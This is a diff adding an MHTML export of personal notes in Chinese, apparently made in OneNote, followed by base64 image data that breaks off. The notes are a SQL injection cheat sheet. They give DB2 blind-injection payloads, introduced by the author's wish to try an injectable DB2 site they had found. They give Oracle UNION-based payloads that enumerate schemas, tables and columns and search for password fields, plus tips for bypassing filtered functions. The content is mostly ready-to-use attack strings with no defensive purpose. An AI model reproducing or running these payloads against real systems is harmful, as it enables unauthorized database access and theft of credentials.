+ lang=3Den-US>Db2</span><span style=3D'font-weight:bold' lang=3Dzh-CN>注�=
+�】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>使用DB2的人比较少了，今天碰到了一个可�=
+�注入的DB2网站，想试试身手。不过在网上很难找到相关�=
+�资料，只好自己研究了。</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>参考了IBM DB2的文档，总结了这样几条：</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>1、select NAME from SYSIBM.SYSTABLES where CREATOR =3DU=
+SER</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>可以返回系统中所有用户创建的表（table）=
+名</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>2、select NAME from SYSIBM.SYSCOLUMNS where TBCREATOR =
+=3D ''
+ and TBNAME=3D''</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>返回表中的列名</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>3、select NAME from SYSIBM.SYSTABLES where CREATOR =3DU=
+SER
+ FETCH FIRST 1 ROWS ONLY</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>这是最关键的地方，返回第一条记录，类�=
+�于sql server中的top 1</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>4、SUBSTR(string, position, length)</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>返回字符串子串的函数，类似于mid</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>5、ASCII()这个就不用多说了。</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>有了这些语句和函数，我们就可以很方便�=
+�用ascii拆半法猜出所有的table名，字段名，以及其中的数�=
+��了。</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>例如判断第一个table的名称的第一个字符的=
+ascii码是否大于50：</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><a href=3D"http://*.com?test.jsp?id=3D1">http://*.com?te=
+st.jsp?id=3D1</a>
+ and (select ASCII(SUBSTR(NAME,1,1)) from SYSIBM.SYSTABLES where CREATOR =
+=3DUSER
+ FETCH FIRST 1 ROWS ONLY)&gt;50 --</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image001.png" width=3D16 height=3D16 alt=3D重要>&n=
+bsp;<span
+ style=3D'font-weight:bold' lang=3Dzh-CN>【</span><span style=3D'font-weig=
+ht:bold'
+ lang=3Den-US>Oracle</span><span style=3D'font-weight:bold' lang=3Dzh-CN>�=
+�入】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>oder
+ by N </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>#
+ 爆出第一个数据库名 </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>and
+ 1=3D2 union select 1,2,(select banner from sys.v_ where rownum=3D1),4,5,6 =
+from
+ dual </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>#
+ 依次爆出所有数据库名,假设第一个库名为first_dbname </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>and
+ 1=3D2 union select 1,2,(select owner from all_tables where rownum=3D1 and
+ owner&lt;&gt;'first_dbname'),4,5,6 from dual </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>爆出表名
+ </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>and
+ 1=3D2 union select 1,2,(select table_name from user_tables where rownum=3D=
+1),4,5,6
+ from dual </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>同理,同爆出下一个数据库类似爆出下一个表名就=
+不说了,但是必须注意表名用大写或者表名大写的十六进�=
+�代码。
+ </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>有时候我们只想要某个数据库中含密码字段的表�=
+��,采用模糊查询语句，如下：
+ </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>and
+ (select column_name from user_tab_columns where column_name like
+ '%25pass%25')&lt;0 </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>爆出表tablename中的第一个字段名
+ </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>and
+ 1=3D2 union select 1,2,(select column_name from user_tab_columns where
+ table_name=3D'tablename' and rownum=3D1),4,5,6 from dual </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>依次下一个字段名
+ </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>and
+ 1=3D2 union select 1,2,(select column_name from user_tab_columns where
+ table_name=3D'tablename' and column_name&lt;&gt;'first_col_name' and
+ rownum=3D1),4,5,6 from dual </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>若为基于时间或者基于bool类型盲注，可结合substr
+ 、ASCII进行赋值盲测。 </p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>若屏蔽关键函数，可尝试SYS_CONTEXT('USERENV','CURRENT_=
+USER')类用法。</p>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt;
+ color:red'>&nbsp;</p>
+</ul>
+
+</div>
+
+</div>
+
+</div>
+
+<div>
+
+<p style=3D'margin:0in'>&nbsp;</p>
+
+<p style=3D'text-align:left;margin:0in;font-family:Arial;font-size:9pt;
+color:#969696;direction:ltr'>已使用 Microsoft OneNote 2016 创建。</p>
+
+</div>
+
+</body>
+
+</html>
+
+------=_NextPart_01D282BC.499D8C10
+Content-Location: file:///C:/D1AFCA88/file8792.files/image001.png
+Content-Transfer-Encoding: base64
+Content-Type: image/png
+
+iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAFZSURBVDhPlZHNSsNAEMd3NhEs5ORX4kUfwKNe
+WkjFXr0VRNCjIOjVq7akd99BEDzaR1BUPIi+REFaLd4KFTUZZ7ZjG7oJtT9IZuY/O7uzs6By6N43
+1hHVM4DaWAxrLyJbaLEWmOAB2yTBQyPkkNnB203dA8dpk+vR18M4Xva3op5JjpHZAWjYJcPFjKdd
+Z098i8wNUOkjcQ1JonKvAe93DRR/apbKNdCo4Jim/SXav+D1XMe+GWLnNipqDdfkBhxPoIMAO354
+9sDB8BVo8gFNnjcpDhQbVPjkuE51oXT6KtJoiPRMHWrrUsIc9EW6mBl7BdwWJwc7P7xC6/G8MPvd
++1AABZFsEPufM978SumkL8qoAyqupIvpvlcuxKtsRaLjgA+pSGRIX2HQHmI3Aaz65fr+XBi12HLM
+usn/rROGG9AAN+nX/AF3LQjrTZENHLPOeVo3YU5TodQvR4Zv1e5l2qgAAAAASUVORK5CYIJ=
+
+------=_NextPart_01D282BC.499D8C10
+Content-Location: file:///C:/D1AFCA88/file8792.files/image002.png
+Content-Transfer-Encoding: base64
+Content-Type: image/png
+
+iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAFgSURBVDhPlZHPS0JBEMdnNugl79262Kk/oGNd
+PAkd1aykEuoYBHXrDxARqWv/QhAERSSFStegk9Q/EURBdNOs8O20sw7+6K2SH3jMzHd25s3sIowg
+XagsEqhHBL1UK68/iRxBiY1AgLtsNeGeFUbgnCBZvAz80Hs12cB0aramvufuS1tNSQ/hnMAnL2+L
+GWMD7W1b34GzARHsi2vRACPXwFThhsSfmHp5FZXWcGD++CPav+DzXMe+vcRM4TYRkr5GxDjH4yCi
+NyK1eXeUfeC49wqpYjVOYYebJESKYHZtqFDlascrLyL1L7FeypjOeCahE9JwOljMDL0CIqTFdeLK
+91bYOLyItYKZDyPERIpgVmj7za/Zq5N8W6T+BJ+Bt/yn+FwpnGfbDe3fYnxOQsvgCjIevSNQzrzx
+TrWUfWbLMevd/PAa/QaESfO+Fd2ZXqiV1yqiWjhmnfPmG3tPEwLwC+WNev7gLzhYAAAAAElFTkSu
+QmCC
+
+------=_NextPart_01D282BC.499D8C10
+Content-Location: file:///C:/D1AFCA88/file8792.files/image003.png
+Content-Transfer-Encoding: base64
+Content-Type: image/png
+
+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
